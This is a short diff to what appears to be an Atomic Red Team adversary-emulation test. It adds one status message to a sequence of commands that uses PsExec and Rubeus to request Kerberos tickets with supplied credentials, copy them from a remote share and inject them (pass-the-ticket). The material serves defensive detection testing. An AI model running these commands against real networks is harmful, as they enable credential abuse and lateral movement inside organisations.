@@ -97,6 +97,7 @@ atomic_tests:
       #{psexec_path} -accepteula \\#{target} -w c:\ -c #{rubeus_path} asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
       Set-Location $env:TEMP
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
+      Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
       cmd /c "#{rubeus_path}" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
       Remove-Item $env:TEMP\ticket.kirbi
       cmd /c "#{rubeus_path}" purge      
